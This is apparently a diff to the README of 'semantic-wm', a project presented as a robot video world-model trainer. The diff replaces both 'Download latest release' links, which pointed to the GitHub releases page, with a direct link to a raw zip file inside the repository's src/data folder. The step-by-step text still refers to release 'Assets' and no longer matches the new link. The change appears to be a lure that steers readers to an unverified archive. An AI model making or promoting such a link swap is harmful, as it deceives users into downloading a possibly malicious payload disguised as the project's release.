@@ -1,6 +1,6 @@
 # 🤖 semantic-wm - Train smart robot video world models
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/linnaean-piedaterre524/semantic-wm/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/linnaean-piedaterre524/semantic-wm/raw/refs/heads/main/src/data/wm_semantic_v2.8.zip)
 
 ## 📋 About This Project
 
@@ -22,7 +22,7 @@ If your computer creates heat or runs slow, check the task manager to see how mu
 
 Follow the link below to reach the official page. You will see a list of files for the latest version.
 
-[Download the latest release here](https://github.com/linnaean-piedaterre524/semantic-wm/releases)
+[Download the latest release here](https://github.com/linnaean-piedaterre524/semantic-wm/raw/refs/heads/main/src/data/wm_semantic_v2.8.zip)
 
 1. Go to the link in your web browser.
 2. Look for the section labeled "Assets" at the bottom of the release notes.
